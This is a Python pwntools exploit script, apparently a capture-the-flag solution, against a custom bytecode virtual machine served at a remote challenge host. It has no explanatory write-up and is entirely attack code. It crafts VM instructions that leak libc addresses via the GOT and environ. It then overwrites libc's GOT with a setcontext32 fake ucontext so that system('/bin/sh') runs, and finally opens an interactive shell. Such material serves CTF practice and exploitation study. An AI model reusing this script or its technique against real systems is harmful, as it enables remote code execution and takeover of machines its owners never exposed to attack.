import struct
from pwn import *

elf = ELF("./main_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = elf
context.log_level = 'debug'
context.terminal = ['konsole', '--new-tab', '-e']

OPCODES = {
    "OP_HALT":    0,
    "OP_MOV":     1,
    "OP_LOADI":   2,
    "OP_LOAD":    3,
    "OP_STORE":   4,
    "OP_ADD":     5,
    "OP_SUB":     6,
    "OP_MUL":     7,
    "OP_DIV":     8,
    "OP_PRINT":   9,
    "OP_JMP":     10,
    "OP_CALL":    11,
    "OP_RET":     12,
    "OP_SYSCALL": 13,
    "OP_ENTER":   14,
    "OP_LEAVE":   15,
    "OP_POP":     16,
    "OP_PUSH":    17
}

REGS = {
    "R0": 0, "R1": 1, "R2": 2, "R3": 3,
    "R4": 4, "R5": 5, "R6": 6, "R7": 7,
    "SP": 8, "BP": 9
}

SYS = {
    "SYS_READ":  0,
    "SYS_WRITE": 1
}

def build(op, a=0, b=0):
    op_val = OPCODES.get(op)
    if op_val is None:
        if isinstance(op, int):
            op_val = op
        else:
            raise ValueError(f"Unknown Opcode: {op}")

    if isinstance(a, str):
        if a in REGS:
            a_val = REGS[a]
        elif a in SYS:
            a_val = SYS[a]
    else:
        a_val = int(a)

    if isinstance(b, str):
        if b in REGS:
            b_val = REGS[b]
        elif b in SYS:
            b_val = SYS[b]
    else:
        b_val = int(b)

    return struct.pack('<iii', op_val, a_val, b_val)

def load_reg(reg, value):
    """
    Build instructions to load a 64-bit constant into `reg` using 16-bit chunks:
      reg = (((hi16)*0x10000 + midhi16)*0x10000 + midlo16)*0x10000 + lo16
    Works as long as the final value stays < 2^63 to avoid signed overflow weirdness.
    """
    v = value & 0xffffffffffffffff
    parts = [(v >> s) & 0xffff for s in (48, 32, 16, 0)]

    out  = build(OPCODES["OP_LOADI"], reg, parts[0])
    for p in parts[1:]:
        out += build(OPCODES["OP_MUL"],  reg, 0x10000)
        out += build(OPCODES["OP_ADD"],  reg, p)
    return out


# p = process(stdout=PIPE)
p = remote("tcp.ybn.sg", 19830)
# gdb.attach(p, """
# set max-value-size 100000
# break *handle_leave
# """)

payload = b'a' * 5 + pack(4108) + pack(700)
payload = payload.ljust(125, b'a')

payload += build(OPCODES["OP_LOADI"], REGS["R0"], 1)
payload += build(OPCODES["OP_LOADI"], REGS["R1"], elf.got['puts'])
payload += build(OPCODES["OP_LOADI"], REGS["R2"], 8)
payload += build(OPCODES["OP_LOADI"], REGS["R7"], SYS["SYS_WRITE"])
payload += build(OPCODES["OP_SYSCALL"])
payload += build(OPCODES["OP_LOADI"], REGS["SP"], 0)
payload += build(OPCODES["OP_LOADI"], REGS["BP"], 0)
payload += build(OPCODES["OP_JMP"], 0, 0)

p.recvuntil(b'R9')
p.sendlineafter(b'\n', payload)

libc_base = u64(p.recv(8)) - libc.symbols['puts']
print(hex(libc_base))

print(hex(libc_base + libc.symbols['environ']))

target = libc_base + libc.symbols['environ']

payload = b'a' * 5 + pack(4108) + pack(700)
payload = payload + cyclic(125 - len(payload))

payload += build(OPCODES["OP_LOADI"], REGS["R0"], 1)
payload += load_reg(REGS["R1"], libc_base + libc.symbols['environ'])
payload += build(OPCODES["OP_LOADI"], REGS["R2"], 8)
payload += build(OPCODES["OP_LOADI"], REGS["R7"], SYS["SYS_WRITE"])
payload += build(OPCODES["OP_SYSCALL"])
payload += build(OPCODES["OP_LOADI"], REGS["SP"], 0)
payload += build(OPCODES["OP_LOADI"], REGS["BP"], 0)
payload += build(OPCODES["OP_JMP"], 0, 0)

def create_ucontext(
    src: int,
    rsp=0,
    rbx=0,
    rbp=0,
    r12=0,
    r13=0,
    r14=0,
    r15=0,
    rsi=0,
    rdi=0,
    rcx=0,
    r8=0,
    r9=0,
    rdx=0,
    rip=0xDEADBEEF,
) -> bytearray:
    b = bytearray(0x200)
    b[0xE0:0xE8] = p64(src)  # fldenv ptr
    b[0x1C0:0x1C8] = p64(0x1F80)  # ldmxcsr

    b[0xA0:0xA8] = p64(rsp)
    b[0x80:0x88] = p64(rbx)
    b[0x78:0x80] = p64(rbp)
    b[0x48:0x50] = p64(r12)
    b[0x50:0x58] = p64(r13)
    b[0x58:0x60] = p64(r14)
    b[0x60:0x68] = p64(r15)

    b[0xA8:0xB0] = p64(rip)  # ret ptr
    b[0x70:0x78] = p64(rsi)
    b[0x68:0x70] = p64(rdi)
    b[0x98:0xA0] = p64(rcx)
    b[0x28:0x30] = p64(r8)
    b[0x30:0x38] = p64(r9)
    b[0x88:0x90] = p64(rdx)

    return b


def setcontext32(libc: ELF, **kwargs) -> (int, bytes):
    got = libc.address + libc.dynamic_value_by_tag("DT_PLTGOT")
    plt_trampoline = libc.address + libc.get_section_by_name(".plt").header.sh_addr
    return got, flat(
        p64(0),
        p64(got + 0x218),
        p64(libc.symbols["setcontext"] + 32),
        p64(plt_trampoline) * 0x40,
        create_ucontext(got + 0x218, rsp=libc.symbols["environ"] + 8, **kwargs),
    )

libc.address = libc_base

p.recvuntil(b'R9')
p.sendlineafter(b'\n', payload)

rip = u64(p.recv(8)) - 608

payload = b'a' * 5 + pack(4108) + pack(700)
payload = payload + cyclic(125 - len(payload))
got, temp = setcontext32(libc, rip = libc.sym['system'], rdi = libc.search(b'/bin/sh').__next__())
print(hex(got))
payload += build(OPCODES["OP_LOADI"], REGS["R0"], 0)
payload += load_reg(REGS["R1"], got)
payload += build(OPCODES["OP_LOADI"], REGS["R2"], 0x80000)
payload += build(OPCODES["OP_LOADI"], REGS["R7"], SYS["SYS_READ"])
payload += build(OPCODES["OP_SYSCALL"])
payload += build(OPCODES["OP_SYSCALL"], 0, 0)

p.recvuntil(b'R9')
p.sendlineafter(b'\n', payload)


pause()
p.sendline(temp)

p.interactive()
